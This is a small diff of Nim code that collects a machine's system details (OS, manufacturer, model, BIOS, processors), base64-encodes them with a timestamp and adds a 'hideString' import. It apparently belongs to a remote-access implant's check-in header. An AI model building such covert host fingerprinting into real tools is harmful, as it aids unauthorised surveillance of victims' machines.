@@ -4,7 +4,9 @@ from strutils import unIndent
 from base64 import encode
 from times import now
 from times import DateTime
+
 import ../functions/runCmd
+import ../functions/hideString
 
 proc formatData(data: string): string =
   result = ";" & encode unIndent data.split(": ")[1]
@@ -31,9 +33,11 @@ proc header*(): string =
       if line.contains("BIOS Version:"):
         getProcessors = false
 
-      if line.contains("OS Name:") or line.contains("System Manufacturer:"):
+      if line.contains("OS Name:") or line.contains(
+           "System Manufacturer:"):
         cache = line
-      elif line.contains("OS Version:") or line.contains("System Model:"):
+      elif line.contains("OS Version:") or line.contains(
+           "System Model:"):
         result.add formatData(cache & " " & unIndent(line.split(": ")[1]))
       else:
         result.add formatData line
@@ -46,5 +50,6 @@ proc header*(): string =
 
   let now: DateTime = now()
 
-  result.add ";" & encode $now.year & "/" & $now.month & "/" & $now.monthday & "/" &
+  result.add ";" & encode $now.year & "/" & $now.month & "/" &
+      $now.monthday & "/" &
     $now.hour & "/" & $now.minute & "/" & $now.second & " LOCAL"
